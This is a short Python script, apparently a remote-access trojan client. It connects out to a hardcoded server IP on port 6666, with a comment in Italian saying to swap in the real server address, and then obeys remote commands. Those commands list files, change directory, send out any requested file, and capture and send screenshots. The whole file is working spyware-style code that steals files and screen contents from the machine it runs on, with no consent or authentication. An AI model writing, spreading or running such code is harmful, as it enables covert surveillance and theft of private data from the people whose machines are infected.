import socket
import os
import json
import mss
import datetime

BUFFER_SIZE = 4096

def take_screenshot():
    filename = f"screenshot_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
    with mss.mss() as sct:
        sct.shot(output=filename)
    return filename

def handle_server(client):
    while True:
        command = client.recv(BUFFER_SIZE).decode()
        if not command:
            break

        if command == "exit":
            break
        elif command == "list_files":
            files = os.listdir()
            client.send(json.dumps(files).encode())
        elif command.startswith("cd"):
            try:
                dir_to = command.split(' ',1)[1]
                os.chdir(dir_to)
                client.send(b"OK")
            except Exception as e:
                client.send(f"ERROR: {e}".encode())
        elif command.startswith("download"):
            filename = command.split(' ',1)[1]
            try:
                with open(filename, 'rb') as f:
                    client.send(f.read())
            except Exception as e:
                client.send(f"ERROR: {e}".encode())
        elif command == "screenshot":
            try:
                filename = take_screenshot()
                with open(filename, 'rb') as f:
                    client.send(f.read())
                os.remove(filename)
            except Exception as e:
                client.send(f"ERROR: {e}".encode())
        else:
            client.send(b"Unknown command")

def start_client():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(('82.84.5.150', 6666))  # Cambia con IP reale server
    try:
        handle_server(client)
    finally:
        client.close()

if __name__ == "__main__":
    start_client()
